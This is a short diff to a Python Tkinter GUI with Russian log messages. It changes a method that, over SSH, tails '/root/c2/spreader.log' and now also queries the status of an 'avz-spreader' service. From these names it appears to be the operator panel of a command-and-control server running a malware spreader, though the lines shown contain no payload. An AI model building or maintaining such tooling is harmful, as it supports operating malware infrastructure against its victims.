@@ -292,9 +292,11 @@ class {class_name}(ttk.Frame):
     def show_spreader_log(self):
         if not self._ensure_pass(): return
         self.log.delete(1.0, tk.END)
-        self.log.insert(tk.END, "[*] Получение лога спредера...\n")
+        self.log.insert(tk.END, "[*] Получение лога спредера и статуса...\n")
         def task():
             out, _ = self._ssh_exec("cat /root/c2/spreader.log 2>/dev/null | tail -30")
-            self.log.insert(tk.END, "--- Последние 30 строк spreader.log ---\n" + (out if out else "файл пуст или отсутствует\n"))
+            self.log.insert(tk.END, "--- spreader.log ---\n" + (out if out else "файл пуст или отсутствует\n"))
+            out, _ = self._ssh_exec("systemctl status avz-spreader --no-pager 2>&1 | head -20")
+            self.log.insert(tk.END, "--- Статус сервиса ---\n" + out)
             self.log.see(tk.END)
         threading.Thread(target=task, daemon=True).start()
